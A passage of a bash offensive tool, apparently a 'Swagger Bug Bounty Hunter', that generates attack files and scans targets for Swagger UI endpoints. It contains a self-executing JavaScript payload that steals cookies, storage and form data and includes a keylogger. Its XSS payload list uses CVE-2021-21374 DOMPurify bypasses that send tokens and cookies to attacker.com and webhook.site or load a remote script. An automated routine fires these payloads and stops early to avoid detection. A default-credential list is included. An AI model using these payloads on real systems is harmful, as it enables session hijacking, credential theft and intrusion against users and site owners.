                    action: form.action,
                    method: form.method,
                    url: location.href,
                    timestamp: Date.now()
                })
            });
        });
    });
}

// Keylogger (use with caution)
function installKeylogger() {
    let keyBuffer = '';
    const webhookUrl = 'https://webhook.site/your-unique-id';
    
    document.addEventListener('keydown', function(e) {
        keyBuffer += e.key;
        
        // Send data every 50 characters or on Enter
        if (keyBuffer.length >= 50 || e.key === 'Enter') {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type: 'keylog',
                    data: keyBuffer,
                    url: location.href,
                    timestamp: Date.now()
                })
            });
            keyBuffer = '';
        }
    });
}

// Main execution function
function executePayload() {
    // Wait for page to load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executePayload);
        return;
    }
    
    // Execute theft functions
    stealCookies();
    stealLocalStorage();
    stealSessionStorage();
    hijackForms();
    
    // Uncomment next line for keylogging (high risk)
    // installKeylogger();
    
    // Visual confirmation for testing
    console.log('[XSS] Payload executed successfully');
    
    // Optional: subtle visual indicator
    if (window.location.hostname === 'localhost' || window.location.hostname.includes('test')) {
        document.title = '[PWNED] ' + document.title;
    }
}

// Auto-execute
executePayload();

// Export functions for manual execution
window.swaggerXSS = {
    stealCookies,
    stealLocalStorage,
    stealSessionStorage,
    hijackForms,
    installKeylogger,
    executePayload
};
EOF
    
    print_success "Created script.js: $file_path"
}

create_sample_login() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
{
  "description": "Authentication configuration for Swagger endpoint access",
  "version": "1.0",
  "authentication": {
    "method": "form_login",
    "login_url": "https://api.example.com/login",
    "credentials": {
      "username": "admin",
      "password": "password123"
    },
    "form_fields": {
      "username_field": "username",
      "password_field": "password",
      "csrf_field": "csrf_token",
      "additional_fields": {
        "remember_me": "false",
        "redirect": "/dashboard"
      }
    },
    "headers": {
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "text/html,application/json",
      "User-Agent": "SwaggerBugBountyHunter/4.0",
      "X-Requested-With": "XMLHttpRequest"
    },
    "cookies": {
      "required_cookies": [
        "JSESSIONID",
        "csrf_token"
      ],
      "session_cookie": "session_id",
      "remember_cookie": "remember_token"
    }
  },
  "session_management": {
    "session_timeout": 3600,
    "keep_alive": true,
    "keep_alive_interval": 300,
    "keep_alive_url": "https://api.example.com/ping",
    "logout_url": "https://api.example.com/logout"
  },
  "multi_factor": {
    "enabled": false,
    "method": "totp",
    "backup_codes": [],
    "sms_number": "+1234567890"
  },
  "oauth_config": {
    "enabled": false,
    "provider": "google",
    "client_id": "your-oauth-client-id",
    "client_secret": "your-oauth-client-secret",
    "redirect_uri": "https://api.example.com/auth/callback",
    "scope": "openid profile email",
    "authorization_url": "https://accounts.google.com/o/oauth2/auth",
    "token_url": "https://oauth2.googleapis.com/token"
  },
  "api_authentication": {
    "method": "bearer_token",
    "token_endpoint": "https://api.example.com/auth/token",
    "token_type": "JWT",
    "refresh_token_endpoint": "https://api.example.com/auth/refresh",
    "token_storage": "header",
    "header_name": "Authorization",
    "header_prefix": "Bearer "
  },
  "testing_credentials": [
    {
      "username": "admin",
      "password": "admin123",
      "role": "administrator"
    },
    {
      "username": "user",
      "password": "user123",
      "role": "standard_user"
    },
    {
      "username": "guest",
      "password": "guest",
      "role": "read_only"
    },
    {
      "username": "test",
      "password": "test",
      "role": "test_account"
    }
  ],
  "validation": {
    "success_indicators": [
      "Welcome",
      "Dashboard",
      "Logout",
      "Profile"
    ],
    "failure_indicators": [
      "Invalid credentials",
      "Login failed",
      "Access denied",
      "Unauthorized"
    ],
    "redirect_patterns": [
      "/dashboard",
      "/home",
      "/profile",
      "/admin"
    ]
  }
}
EOF
    
    print_success "Created login.json: $file_path"
}

create_sample_swagger_yaml() {
    local file_path="$1"
    
    cat > "$file_path" << 'EOF'
swagger: "2.0"
info:
  title: "Bug Bounty Test API"
  description: "Sample Swagger specification for security testing"
  version: "1.0.0"
  contact:
    name: "Security Team"
    email: "security@example.com"
  license:
    name: "MIT"
    url: "https://opensource.org/licenses/MIT"

host: "api.example.com"
basePath: "/v1"
schemes:
  - "https"
  - "http"

consumes:
  - "application/json"
  - "application/xml"
produces:
  - "application/json"
  - "application/xml"

securityDefinitions:
  api_key:
    type: "apiKey"
    name: "X-API-Key"
    in: "header"
  bearer_token:
    type: "apiKey"
    name: "Authorization"
    in: "header"
  basic_auth:
    type: "basic"
  oauth2:
    type: "oauth2"
    authorizationUrl: "https://api.example.com/oauth/authorize"
    tokenUrl: "https://api.example.com/oauth/token"
    flow: "accessCode"
    scopes:
      read: "Read access"
      write: "Write access"
      admin: "Admin access"

security:
  - api_key: []
  - bearer_token: []

paths:
  /users:
    get:
      summary: "Get all users"
      description: "Retrieve a list of all users"
      tags:
        - "Users"
      security:
        - api_key: []
      parameters:
        - name: "limit"
          in: "query"
          description: "Number of users to return"
          required: false
          type: "integer"
          default: 10
        - name: "offset"
          in: "query"
          description: "Number of users to skip"
          required: false
          type: "integer"
          default: 0
      responses:
        200:
          description: "Successful response"
          schema:
            type: "array"
            items:
              $ref: "#/definitions/User"
        401:
          description: "Unauthorized"
        403:
          description: "Forbidden"
        500:
          description: "Internal server error"
    
    post:
      summary: "Create a new user"
      description: "Create a new user account"
      tags:
        - "Users"
      security:
        - bearer_token: []
      parameters:
        - name: "user"
          in: "body"
          description: "User object"
          required: true
          schema:
            $ref: "#/definitions/UserCreate"
      responses:
        201:
          description: "User created successfully"
          schema:
            $ref: "#/definitions/User"
        400:
          description: "Bad request"
        401:
          description: "Unauthorized"
        409:
          description: "User already exists"

  /users/{id}:
    get:
      summary: "Get user by ID"
      description: "Retrieve a specific user by their ID"
      tags:
        - "Users"
      security:
        - api_key: []
      parameters:
        - name: "id"
          in: "path"
          description: "User ID"
          required: true
          type: "integer"
      responses:
        200:
          description: "Successful response"
          schema:
            $ref: "#/definitions/User"
        404:
          description: "User not found"
        401:
          description: "Unauthorized"
    
    put:
      summary: "Update user"
      description: "Update an existing user"
      tags:
        - "Users"
      security:
        - bearer_token: []
      parameters:
        - name: "id"
          in: "path"
          description: "User ID"
          required: true
          type: "integer"
        - name: "user"
          in: "body"
          description: "Updated user object"
          required: true
          schema:
            $ref: "#/definitions/UserUpdate"
      responses:
        200:
          description: "User updated successfully"
          schema:
            $ref: "#/definitions/User"
        400:
          description: "Bad request"
        401:
          description: "Unauthorized"
        404:
          description: "User not found"
    
    delete:
      summary: "Delete user"
      description: "Delete a user account"
      tags:
        - "Users"
      security:
        - bearer_token: []
        - oauth2: ["admin"]
      parameters:
        - name: "id"
          in: "path"
          description: "User ID"
          required: true
          type: "integer"
      responses:
        204:
          description: "User deleted successfully"
        401:
          description: "Unauthorized"
        403:
          description: "Forbidden"
        404:
          description: "User not found"

  /admin/users:
    get:
      summary: "Get all users (admin)"
      description: "Administrative endpoint to retrieve all users with sensitive data"
      tags:
        - "Admin"
      security:
        - oauth2: ["admin"]
      responses:
        200:
          description: "Successful response"
          schema:
            type: "array"
            items:
              $ref: "#/definitions/AdminUser"
        401:
          description: "Unauthorized"
        403:
          description: "Forbidden - Admin access required"

  /debug/info:
    get:
      summary: "Debug information"
      description: "Get system debug information (should be disabled in production)"
      tags:
        - "Debug"
      responses:
        200:
          description: "Debug information"
          schema:
            type: "object"
            properties:
              version:
                type: "string"
              environment:
                type: "string"
              database_url:
                type: "string"
              secret_key:
                type: "string"

definitions:
  User:
    type: "object"
    required:
      - "id"
      - "username"
      - "email"
    properties:
      id:
        type: "integer"
        format: "int64"
        example: 1
      username:
        type: "string"
        example: "johndoe"
      email:
        type: "string"
        format: "email"
        example: "john@example.com"
      first_name:
        type: "string"
        example: "John"
      last_name:
        type: "string"
        example: "Doe"
      created_at:
        type: "string"
        format: "date-time"
      updated_at:
        type: "string"
        format: "date-time"

  UserCreate:
    type: "object"
    required:
      - "username"
      - "email"
      - "password"
    properties:
      username:
        type: "string"
        minLength: 3
        maxLength: 50
      email:
        type: "string"
        format: "email"
      password:
        type: "string"
        minLength: 8
      first_name:
        type: "string"
      last_name:
        type: "string"

  UserUpdate:
    type: "object"
    properties:
      username:
        type: "string"
        minLength: 3
        maxLength: 50
      email:
        type: "string"
        format: "email"
      first_name:
        type: "string"
      last_name:
        type: "string"

  AdminUser:
    type: "object"
    allOf:
      - $ref: "#/definitions/User"
      - type: "object"
        properties:
          password_hash:
            type: "string"
          last_login:
            type: "string"
            format: "date-time"
          login_count:
            type: "integer"
          ip_address:
            type: "string"
          user_agent:
            type: "string"
          is_active:
            type: "boolean"
          role:
            type: "string"
            enum: ["user", "admin", "moderator"]

  Error:
    type: "object"
    required:
      - "code"
      - "message"
    properties:
      code:
        type: "integer"
        format: "int32"
      message:
        type: "string"
      details:
        type: "string"
EOF
    
    print_success "Created Swagger.yaml: $file_path"
}

# Function to download wordlists from kdairatchi/swagger repository
download_wordlists() {
    local wordlist_dir="${OUTPUT_DIR}/wordlists"
    mkdir -p "$wordlist_dir"
    
    print_status "Downloading Swagger wordlists from kdairatchi/swagger repository..."
    
    # Download swagger-wordlist.txt
    if command -v curl >/dev/null 2>&1; then
        if curl -s --max-time 30 "${GITHUB_REPO}/swagger-wordlist.txt" -o "${wordlist_dir}/swagger-wordlist.txt" 2>/dev/null; then
            print_success "Downloaded swagger-wordlist.txt"
        else
            print_warning "Failed to download swagger-wordlist.txt, using built-in wordlist"
            create_builtin_wordlist "${wordlist_dir}/swagger-wordlist.txt"
        fi
    else
        print_warning "curl not available, using built-in wordlist"
        create_builtin_wordlist "${wordlist_dir}/swagger-wordlist.txt"
    fi
    
    # Create comprehensive wordlist combining multiple sources
    create_comprehensive_wordlist "${wordlist_dir}/comprehensive-swagger.txt"
}

# Function to create built-in wordlist enhanced with kdairatchi/swagger patterns
create_builtin_wordlist() {
    local wordlist_file="$1"
    
    cat > "$wordlist_file" << 'EOF'
# Core Swagger/OpenAPI endpoints
swagger-ui
swagger-ui.html
swagger
swagger/
swagger/ui
swagger/ui/
swagger/index.html
docs
docs/
api-docs
api-docs/
documentation
documentation/
openapi.json
swagger.json
swagger.yaml
api/swagger.json
api/swagger.yaml
api/openapi.json

# Versioned API endpoints from kdairatchi research
api
api/
api/doc
api/apidocs
api/v1
api/v2
api/v3
v1/swagger.json
v2/swagger.json
v3/swagger.json
api/v1/swagger.json
api/v2/swagger.json
api/v3/swagger.json
index.html

# Framework-specific endpoints
swagger-resources
swagger-resources/
swagger-resources/configuration/ui
swagger-resources/configuration/security
api/swagger-resources
webjars/swagger-ui
swagger-ui-bundle.js
swagger-ui-standalone-preset.js
swagger/docs/
swagger/swagger-ui.html

# Environment-specific endpoints
actuator/swagger-ui
management/swagger-ui
dev/swagger-ui
test/swagger-ui
admin/swagger-ui
debug/swagger-ui
internal/swagger-ui

# Additional patterns from kdairatchi research
api/swagger
openapi
EOF
}

# Function to create comprehensive wordlist
create_comprehensive_wordlist() {
    local wordlist_file="$1"
    
    cat > "$wordlist_file" << 'EOF'
# Swagger UI Endpoints
swagger-ui
swagger-ui/
swagger-ui.html
swagger-ui/index.html
swagger
swagger/
swagger/ui
swagger/ui/
swagger/index.html
swagger/swagger-ui.html
swaggerui
swaggerui/

# Documentation Endpoints  
docs
docs/
documentation
documentation/
api-docs
api-docs/
apidocs
apidocs/
api/docs
api/docs/
api/documentation
api/documentation/

# OpenAPI/Swagger JSON/YAML
openapi.json
openapi.yaml
swagger.json
swagger.yaml
api-docs.json
swagger-spec.json
swagger-spec.yaml
api.json
api.yaml

# Versioned APIs
v1/swagger.json
v1/swagger.yaml
v1/openapi.json
v1/docs
v1/api-docs
v2/swagger.json
v2/swagger.yaml
v2/openapi.json
v2/docs
v2/api-docs
v3/swagger.json
v3/swagger.yaml
v3/openapi.json
v3/docs
v3/api-docs

# API Versioned
api/v1/swagger.json
api/v1/swagger.yaml
api/v1/openapi.json
api/v1/docs
api/v1/api-docs
api/v2/swagger.json
api/v2/swagger.yaml
api/v2/openapi.json
api/v2/docs
api/v2/api-docs
api/v3/swagger.json
api/v3/swagger.yaml
api/v3/openapi.json
api/v3/docs
api/v3/api-docs

# Spring Boot Actuator
actuator/swagger-ui
actuator/swagger-ui/
management/swagger-ui
management/swagger-ui/

# Framework Specific
swagger-resources
swagger-resources/
swagger-resources/configuration/ui
swagger-resources/configuration/security
api/swagger-resources
api/swagger-resources/

# Static Resources
webjars/swagger-ui
webjars/swagger-ui/
static/swagger-ui
static/swagger-ui/
assets/swagger-ui
assets/swagger-ui/

# Environment Specific
dev/swagger-ui
dev/swagger-ui/
test/swagger-ui
test/swagger-ui/
staging/swagger-ui
staging/swagger-ui/
admin/swagger-ui
admin/swagger-ui/
debug/swagger-ui
debug/swagger-ui/
internal/swagger-ui
internal/swagger-ui/

# Language/Framework Specific
.well-known/openapi_configuration
__swagger__/
graphql/
graphiql/
playground/

# Less Common but Found in Wild
help/api
explorer/
sandbox/
console/
developer/
reference/
guides/
EOF
}

# Function to create XSS payloads based on kdairatchi research
create_xss_payloads() {
    local payload_file="$1"
    
    cat > "$payload_file" << 'EOF'
# Basic XSS Payloads for Swagger UI
{"swagger":"2.0","info":{"title":"<script>alert('XSS-BASIC')</script>","version":"1.0"}}
{"swagger":"2.0","info":{"title":"<img src=x onerror=alert('XSS-IMG')>","version":"1.0"}}
{"swagger":"2.0","info":{"title":"<svg onload=alert('XSS-SVG')>","version":"1.0"}}
{"openapi":"3.0.0","info":{"title":"<script>alert('XSS-OPENAPI')</script>","version":"1.0"}}

# Advanced DOMPurify Bypasses (CVE-2021-21374)
{"swagger":"2.0","info":{"title":"<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><noscript><a title=\"</noscript><img src=x onerror=alert('BYPASS-ADVANCED')>","version":"1.0"}}
{"swagger":"2.0","info":{"title":"<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title=\"</style><img src=x onerror=alert('BYPASS-STYLE')>","version":"1.0"}}

# Cookie Extraction Payloads
{"swagger":"2.0","info":{"title":"<img src=x onerror='fetch(\"https://attacker.com/log?cookie=\"+document.cookie)'>","version":"1.0"}}
{"swagger":"2.0","info":{"title":"<script>var i=new Image;i.src=\"https://webhook.site/unique-id?cookie=\"+document.cookie;</script>","version":"1.0"}}

# Local Storage Extraction
{"swagger":"2.0","info":{"title":"<script>var data=JSON.stringify(localStorage);fetch('https://webhook.site/unique-id?data='+btoa(data))</script>","version":"1.0"}}

# Session Token Extraction  
{"swagger":"2.0","info":{"title":"<script>var tokens=[];for(var i=0;i<localStorage.length;i++){var key=localStorage.key(i);if(key.includes('token')||key.includes('jwt')||key.includes('auth')){tokens.push(key+'='+localStorage.getItem(key))}}fetch('https://webhook.site/unique-id?tokens='+btoa(tokens.join('&')))</script>","version":"1.0"}}

# Advanced Persistence Payloads
{"swagger":"2.0","info":{"title":"<script>if(!localStorage.getItem('swagger_pwned')){localStorage.setItem('swagger_pwned',btoa(location.href+'|'+document.cookie));setTimeout(function(){var s=document.createElement('script');s.src='https://attacker.com/payload.js';document.head.appendChild(s)},2000)}</script>","version":"1.0"}}

# Keylogger Payload
{"swagger":"2.0","info":{"title":"<script>document.addEventListener('keydown',function(e){fetch('https://webhook.site/unique-id?key='+e.key+'&url='+location.href)})</script>","version":"1.0"}}

# Form Data Exfiltration
{"swagger":"2.0","info":{"title":"<script>document.addEventListener('submit',function(e){var form=new FormData(e.target);var data={};form.forEach((v,k)=>data[k]=v);fetch('https://webhook.site/unique-id?form='+btoa(JSON.stringify(data)))})</script>","version":"1.0"}}
EOF
}

# Function to discover Swagger endpoints using multiple techniques
discover_swagger_endpoints() {
    local target="$1"
    local output_file="$2"
    
    print_header "🔍 SWAGGER ENDPOINT DISCOVERY"
    print_status "Target: $target"
    print_status "Discovering Swagger/OpenAPI endpoints..."
    
    local wordlist="${OUTPUT_DIR}/wordlists/comprehensive-swagger.txt"
    local found_endpoints=()
    
    echo "# Swagger Discovery Results for $target" > "$output_file"
    echo "# Scan Time: $(date)" >> "$output_file"
    echo "# User-Agent: $USER_AGENT" >> "$output_file"
    echo "" >> "$output_file"
    
    # Read wordlist and test each endpoint
    while IFS= read -r endpoint; do
        # Skip comments and empty lines
        [[ "$endpoint" =~ ^#.*$ ]] || [[ -z "$endpoint" ]] && continue
        
        local url="${target}/${endpoint}"
        
        if [[ "$VERBOSE" == true ]]; then
            print_status "Testing: $url"
        fi
        
        # Make request with proper headers
        local curl_opts=(
            -s
            --max-time "$TIMEOUT"
            -H "User-Agent: $USER_AGENT"
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            -H "Accept-Language: en-US,en;q=0.5"
            -H "Accept-Encoding: gzip, deflate"
            -H "Connection: keep-alive"
            -w "%{http_code}|%{url_effective}|%{content_type}|%{size_download}"
        )
        
        # Add proxy if specified
        [[ -n "$PROXY" ]] && curl_opts+=(-x "$PROXY")
        
        local response
        response=$(timeout "$((TIMEOUT + 5))" curl "${curl_opts[@]}" "$url" 2>/dev/null || echo "000|||0")
        
        local http_code content_type size_download final_url content
        IFS='|' read -r http_code final_url content_type size_download <<< "$(echo "$response" | tail -1)"
        content=$(echo "$response" | head -n -1)
        
        # Check if it's a valid Swagger endpoint
        if [[ "$http_code" == "200" ]] && [[ "$size_download" -gt 100 ]]; then
            local is_swagger=false
            
            # Check content for Swagger indicators
            if echo "$content" | grep -qiE "(swagger|openapi|swagger-ui)"; then
                is_swagger=true
            elif echo "$content_type" | grep -qE "(json|yaml|html)" && echo "$content" | grep -qiE "(swagger|openapi)"; then
                is_swagger=true
            fi
            
            if [[ "$is_swagger" == true ]]; then
                found_endpoints+=("$url")
                SWAGGER_FOUND=$((SWAGGER_FOUND + 1))
                
                print_found "Swagger endpoint: $url"
                
                echo "FOUND: $url" >> "$output_file"
                echo "STATUS: $http_code" >> "$output_file"
                echo "CONTENT-TYPE: $content_type" >> "$output_file"
                echo "SIZE: $size_download bytes" >> "$output_file"
                
                # Detect Swagger version
                local version
                version=$(echo "$content" | grep -oiE "(swagger.*[0-9]+\.[0-9]+\.[0-9]+|version.*[0-9]+\.[0-9]+\.[0-9]+)" | head -1)
                [[ -n "$version" ]] && echo "VERSION: $version" >> "$output_file"
                
                # Check for vulnerable versions (3.14.1 - 3.37.2)
                if echo "$content" | grep -qE "swagger-ui.*(3\.[1-3][0-9]\.[0-9]+)"; then
                    print_warning "Potentially XSS vulnerable: $url"
                    echo "XSS-RISK: HIGH (vulnerable version detected)" >> "$output_file"
                fi
                
                # Check endpoint type
                if echo "$url" | grep -qE "\.(json|yaml)$"; then
                    echo "TYPE: API_SPEC" >> "$output_file"
                else
                    echo "TYPE: UI_INTERFACE" >> "$output_file"
                fi
                
                echo "" >> "$output_file"
            fi
        fi
        
        # Rate limiting (using awk instead of bc)
        sleep_time=$(awk "BEGIN {printf \"%.2f\", 1/$RATE_LIMIT}" 2>/dev/null || echo "0.01")
        sleep "$sleep_time"
        
    done < "$wordlist"
    
    print_success "Discovery complete: $SWAGGER_FOUND endpoints found"
    
    # Write discovered endpoints to file
    if [[ ${#found_endpoints[@]} -gt 0 ]]; then
        printf "%s\n" "${found_endpoints[@]}" > "${OUTPUT_DIR}/discovered_endpoints.txt"
    else
        touch "${OUTPUT_DIR}/discovered_endpoints.txt"
    fi
    
    return 0
}

# Function to test XSS vulnerabilities with advanced payloads
test_swagger_xss() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_header "🎯 XSS VULNERABILITY TESTING"
    
    if [[ ! -f "$discovered_file" ]]; then
        print_warning "No discovered endpoints file found"
        return 0
    fi
    
    local payload_file="${OUTPUT_DIR}/xss_payloads.json"
    create_xss_payloads "$payload_file"
    
    echo "# XSS Testing Results" > "$output_file"
    echo "# Scan Time: $(date)" >> "$output_file"
    echo "" >> "$output_file"
    
    while IFS= read -r endpoint; do
        [[ -z "$endpoint" ]] && continue
        
        print_status "Testing XSS on: $endpoint"
        
        # Test if it's a UI endpoint (not JSON/YAML)
        if echo "$endpoint" | grep -qvE "\.(json|yaml)$"; then
            
                # Read XSS payloads and test each one
            while IFS= read -r payload_line; do
                [[ "$payload_line" =~ ^#.*$ ]] || [[ -z "$payload_line" ]] && continue
                
                # URL encode the payload
                local encoded_payload
                encoded_payload=$(printf '%s' "$payload_line" | jq -sRr @uri 2>/dev/null || echo "$payload_line" | sed 's/ /%20/g; s/"/%22/g; s/</%3C/g; s/>/%3E/g')
                
                local test_url="${endpoint}?url=data:application/json,${encoded_payload}"
                
                if [[ "$VERBOSE" == true ]]; then
                    print_status "Testing payload: $(echo "$payload_line" | cut -c1-50)..."
                fi
                
                local response
                response=$(timeout "$((TIMEOUT + 5))" curl -s --max-time "$TIMEOUT" \
                          -H "User-Agent: $USER_AGENT" \
                          "$test_url" 2>/dev/null || echo "")
                
                # Check for XSS indicators in response (with error handling)
                if [[ -n "$response" ]] && echo "$response" | grep -qE "(alert\(|<script|onerror=|onload=)" && \
                   echo "$response" | grep -qi "swagger"; then
                    
                    VULNERABLE_XSS=$((VULNERABLE_XSS + 1))
                    print_vuln "XSS CONFIRMED: $endpoint"
                    
                    echo "XSS-VULNERABLE: $endpoint" >> "$output_file"
                    echo "PAYLOAD: $payload_line" >> "$output_file"
                    echo "TEST-URL: $test_url" >> "$output_file"
                    echo "RISK: HIGH - DOM XSS via URL parameter" >> "$output_file"
                    echo "CVE: CVE-2021-21374 (if Swagger UI 3.14.1-3.37.2)" >> "$output_file"
                    
                        # Generate PoC
                    echo "POC-PAYLOAD: curl -v '$test_url'" >> "$output_file"
                    
                    # Generate bug bounty report snippet
                    cat >> "$output_file" << EOF
BUG-BOUNTY-REPORT:
---
**Vulnerability:** DOM-based Cross-Site Scripting (XSS) in Swagger UI
**Severity:** High
**URL:** $endpoint
**Parameter:** url
**Payload:** $payload_line
**Impact:** Session hijacking, credential theft, admin account takeover
**Reproduction:**
1. Visit: $test_url
2. Observe JavaScript execution in browser
3. Payload executes in the context of the application domain
**Fix:** Update Swagger UI to version 3.38.0 or later
---
EOF
                    echo "" >> "$output_file"
                    
                    # Only test one payload per endpoint to avoid detection
                    break
                fi
                
                # Small delay between payloads
                sleep 0.5
                
            done < "$payload_file"
        fi
        
    done < "$discovered_file"
    
    print_success "XSS testing complete: $VULNERABLE_XSS vulnerabilities found"
}

# Function to analyze API specifications and find sensitive endpoints
analyze_api_specs() {
    local discovered_file="$1"
    local output_file="$2"
    
    print_header "📋 API SPECIFICATION ANALYSIS"
    
    if [[ ! -f "$discovered_file" ]]; then
        print_warning "No discovered endpoints file found"
        return 0
    fi
    
    echo "# API Analysis Results" > "$output_file"
    echo "# Scan Time: $(date)" >> "$output_file"
    echo "" >> "$output_file"
    
    while IFS= read -r endpoint; do
        [[ -z "$endpoint" ]] && continue
        
        # Test if it's a JSON/YAML spec endpoint
        if echo "$endpoint" | grep -qE "\.(json|yaml)$|api-docs|swagger-resources"; then
            
            print_status "Analyzing API specification: $endpoint"
            
            local response
            response=$(timeout "$((TIMEOUT + 5))" curl -s --max-time "$TIMEOUT" \
                      -H "User-Agent: $USER_AGENT" \
                      -H "Accept: application/json,application/yaml,*/*" \
                      "$endpoint" 2>/dev/null || echo "")
            
            if [[ -n "$response" ]] && (echo "$response" | jq empty 2>/dev/null || echo "$response" | grep -qE "(swagger|openapi)"); then
                
                echo "API-SPEC: $endpoint" >> "$output_file"
                
                # Extract API endpoints
                local api_endpoints
                api_endpoints=$(echo "$response" | jq -r '.paths | keys[]?' 2>/dev/null || echo "")
                
                if [[ -n "$api_endpoints" ]]; then
                    echo "ENDPOINTS-FOUND: $(echo "$api_endpoints" | wc -l)" >> "$output_file"
                    echo "ENDPOINTS:" >> "$output_file"
                    
                    while IFS= read -r api_endpoint; do
                        echo "  - $api_endpoint" >> "$output_file"
                        
                        # Check for sensitive/dangerous endpoints
                        if echo "$api_endpoint" | grep -qiE "(admin|debug|internal|test|dev|mgmt|management|actuator|health|metrics|info|env|config|system|root|user|password|login|auth|token|key|secret|upload|download|delete|execute|eval|cmd)"; then
                            VULNERABLE_ENDPOINTS=$((VULNERABLE_ENDPOINTS + 1))
                            print_warning "Sensitive endpoint: $api_endpoint"
                            echo "    *** SENSITIVE: $api_endpoint ***" >> "$output_file"
                        fi
                        
                    done <<< "$api_endpoints"
                fi
                
                # Extract authentication information
                local auth_info
                auth_info=$(echo "$response" | jq -r '.securityDefinitions // .components.securitySchemes // empty' 2>/dev/null)
                
                if [[ -n "$auth_info" && "$auth_info" != "null" ]]; then
                    echo "AUTHENTICATION:" >> "$output_file"
                    echo "$auth_info" | jq . >> "$output_file" 2>/dev/null || echo "$auth_info" >> "$output_file"
                fi
                
                # Check for sensitive data patterns
                local sensitive_patterns=(
                    "password"
                    "secret"
                    "key"
                    "token"
                    "credential"
                    "private"
                    "api[_-]?key"
                    "access[_-]?token"
                    "jwt"
                    "bearer"
                    "oauth"
                    "database"
                    "mongodb"
                    "mysql"
                    "postgres"
                    "redis"
                )
                
                for pattern in "${sensitive_patterns[@]}"; do
                    if echo "$response" | grep -qiE "$pattern"; then
                        SENSITIVE_DATA=$((SENSITIVE_DATA + 1))
                        print_warning "Sensitive data pattern found: $pattern"
                        echo "SENSITIVE-PATTERN: $pattern" >> "$output_file"
                    fi
                done
                
                # Extract server information
                local server_info
                server_info=$(echo "$response" | jq -r '.host // .servers[]?.url // empty' 2>/dev/null)
                [[ -n "$server_info" ]] && echo "SERVER-INFO: $server_info" >> "$output_file"
                
                # Extract API version
                local api_version
                api_version=$(echo "$response" | jq -r '.info.version // empty' 2>/dev/null)
                [[ -n "$api_version" ]] && echo "API-VERSION: $api_version" >> "$output_file"
                
                echo "" >> "$output_file"
            fi
        fi
        
    done < "$discovered_file"
    
    print_success "API analysis complete: $VULNERABLE_ENDPOINTS sensitive endpoints found"
}

# Function to integrate with bug bounty framework tools
integrate_with_framework() {
    local target="$1"
    
    print_header "🔧 BUG BOUNTY FRAMEWORK INTEGRATION"
    
    local integration_dir="${OUTPUT_DIR}/framework_integration"
    mkdir -p "$integration_dir"
    
    # Extract domain from target URL
    local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    
    # Create nuclei scan for discovered endpoints if nuclei is available
    if command -v nuclei >/dev/null 2>&1 && [[ -f "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
        print_status "Running Nuclei scans on discovered Swagger endpoints..."
        
        if [[ -s "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
            # Run nuclei with swagger-specific templates
            nuclei -l "${OUTPUT_DIR}/discovered_endpoints.txt" \
                   -t ~/nuclei-templates/misconfiguration/swagger-ui.yaml \
                   -t ~/nuclei-templates/exposures/configs/swagger-api.yaml \
                   -t ~/nuclei-templates/vulnerabilities/other/swagger-ui-xss.yaml \
                   -o "${integration_dir}/nuclei_swagger_results.txt" \
                   -silent 2>/dev/null || true
            
            if [[ -f "${integration_dir}/nuclei_swagger_results.txt" && -s "${integration_dir}/nuclei_swagger_results.txt" ]]; then
                print_success "Nuclei scan completed: $(wc -l < "${integration_dir}/nuclei_swagger_results.txt") findings"
            else
                print_status "Nuclei scan completed with no additional findings"
            fi
        fi
    fi
    
    # Validate endpoints with httpx if available
    if command -v httpx >/dev/null 2>&1 && [[ -f "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
        print_status "Validating endpoints with HTTPx..."
        
        if [[ -s "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
            httpx -l "${OUTPUT_DIR}/discovered_endpoints.txt" \
                  -status-code \
                  -content-length \
                  -title \
                  -tech-detect \
                  -o "${integration_dir}/httpx_validation.txt" \
                  -silent 2>/dev/null || true
                  
            if [[ -f "${integration_dir}/httpx_validation.txt" ]]; then
                print_success "HTTPx validation completed"
            fi
        fi
    fi
    
    # Create wayback URL discovery for additional swagger endpoints
    if command -v waybackurls >/dev/null 2>&1; then
        print_status "Searching Wayback Machine for additional Swagger URLs..."
        
        echo "$domain" | waybackurls 2>/dev/null | \
        grep -iE "(swagger|openapi|api-docs|docs)" | \
        sort -u > "${integration_dir}/wayback_swagger_urls.txt" 2>/dev/null || true
        
        if [[ -f "${integration_dir}/wayback_swagger_urls.txt" && -s "${integration_dir}/wayback_swagger_urls.txt" ]]; then
            print_success "Found $(wc -l < "${integration_dir}/wayback_swagger_urls.txt") historical Swagger URLs"
        fi
    fi
    
    # Generate framework-compatible output
    create_framework_outputs "$target" "$integration_dir"
    
    print_success "Framework integration completed"
}

# Function to create outputs compatible with bug bounty framework
create_framework_outputs() {
    local target="$1"
    local integration_dir="$2"
    
    # Create subdomain-style output for framework compatibility
    local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local results_dir="../bug_bounty_results/${domain}_swagger_${timestamp}"
    
    mkdir -p "$results_dir" 2>/dev/null || true
    
    # Copy results in framework format
    if [[ -f "${OUTPUT_DIR}/discovered_endpoints.txt" ]]; then
        cp "${OUTPUT_DIR}/discovered_endpoints.txt" "${results_dir}/swagger_endpoints.txt" 2>/dev/null || true
    fi
    
    if [[ -f "${OUTPUT_DIR}/xss_results.txt" ]]; then
        cp "${OUTPUT_DIR}/xss_results.txt" "${results_dir}/swagger_xss_vulns.txt" 2>/dev/null || true
    fi
    
    if [[ -f "${OUTPUT_DIR}/api_analysis.txt" ]]; then
        cp "${OUTPUT_DIR}/api_analysis.txt" "${results_dir}/api_specifications.txt" 2>/dev/null || true
    fi
    
    # Create summary for framework
    cat > "${results_dir}/swagger_scan_summary.txt" << EOF
# Swagger Security Assessment Summary
# Target: $target
# Scan Date: $(date)
# Tool: Swagger Bug Bounty Hunter v3.0

## Statistics
Swagger Endpoints Found: $SWAGGER_FOUND
